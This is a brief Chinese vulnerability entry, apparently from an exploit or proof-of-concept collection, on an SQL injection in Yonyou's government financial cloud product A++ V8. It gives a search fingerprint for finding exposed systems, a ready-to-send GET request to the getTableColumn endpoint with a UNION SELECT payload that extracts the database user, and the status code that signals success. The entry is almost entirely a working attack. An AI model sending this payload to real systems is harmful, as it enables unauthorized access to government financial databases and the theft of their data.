# 用友政务财务云A++V8getTableColumn存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-政务财务系统"`
- **请求**：`GET /lp/gwzjConfig/getTableColumn?view=LP_PAYFILES_INFO'+UNION+ALL+SELECT+CHR(126)USERCHR(126)+FROM+DUAL-- HTTP/1.1`
- **响应特征**：200